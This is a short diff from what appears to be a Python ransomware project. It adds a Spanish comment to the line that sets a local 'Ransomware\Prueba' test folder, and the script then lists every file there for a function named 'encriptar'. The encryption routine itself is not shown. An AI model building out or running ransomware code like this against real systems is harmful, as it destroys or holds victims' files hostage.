@@ -20,7 +20,7 @@ def encriptar(items, key):
 
 if __name__ == '__main__':
 
-    ruta_encriptar = 'C:\\Users\\fedua\\OneDrive\\Documents\\Ransomware\\Prueba'
+    ruta_encriptar = 'C:\\Users\\fedua\\OneDrive\\Documents\\Ransomware\\Prueba'    #Se pone la dirrecion en donde se encuentra el archivo
     items = os.listdir(ruta_encriptar)
     ruta_completa = [ruta_encriptar+ '\\'+item for item in items]
 
